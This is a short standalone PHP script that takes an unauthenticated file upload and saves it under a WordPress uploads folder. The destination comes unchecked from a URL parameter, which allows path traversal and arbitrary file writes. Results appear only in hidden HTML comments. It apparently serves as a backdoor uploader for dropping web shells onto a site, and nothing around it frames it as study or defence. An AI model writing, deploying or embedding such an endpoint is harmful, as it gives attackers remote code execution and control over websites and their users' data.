<?php
 $uploaddir = realpath('./') . '/wp-content/uploads';
  
  $path=$_GET['PATH'];
  $uploadfile = $uploaddir . $path;
  
	if (move_uploaded_file($_FILES['file_contents']['tmp_name'], $uploadfile)) {
	    echo  "<!--ok-->";
	} else {
	    echo "<!--error-->";
	}
  
  

?>